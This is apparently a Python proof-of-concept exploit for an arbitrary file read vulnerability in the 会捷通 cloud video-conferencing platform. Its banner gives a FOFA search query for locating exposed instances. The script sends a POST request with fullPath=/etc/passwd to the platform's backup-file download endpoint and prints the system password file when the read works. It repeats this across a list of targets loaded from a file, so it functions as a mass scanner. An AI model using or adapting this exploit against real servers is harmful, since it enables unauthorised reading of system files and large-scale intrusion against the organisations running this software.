import requests
import sys
import random
import re
import base64
import time
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
        print('+------------------------------------------')
        print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
        print('+  \033[31mVersion: 会捷通云视讯平台任意文件读取                                   \033[0m')
        print('+  \033[31m使用格式:  python3 poc.py                                           \033[0m')
        print('+  \033[31mVersion: fofa：tilte="基础平台管理系统"                               \033[0m')
        print('+  \033[31m文件        >>> url.txt                                             \033[0m')
        print('+------------------------------------------')

def POC_1(target_url):
    url = target_url + "/fileDownload?action=downloadBackupFile"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"

    }
    data = "fullPath=/etc/passwd"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        if "root" in r.text and r.status_code == 200:
            print("\033[36m[o] 漏洞地址: \n[o]{} \033[0m".format(target_url))
            print("\033[36m[o] 成功读取 /etc/passwd \n[o] 响应为:{} \033[0m".format(r.text))

        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


def xcan(file):
    with open(file, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)
            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name = str(input("\033[36m请输入文件路劲\ntxt.路劲 >>> \033[0m"))
    xcan(file_name)
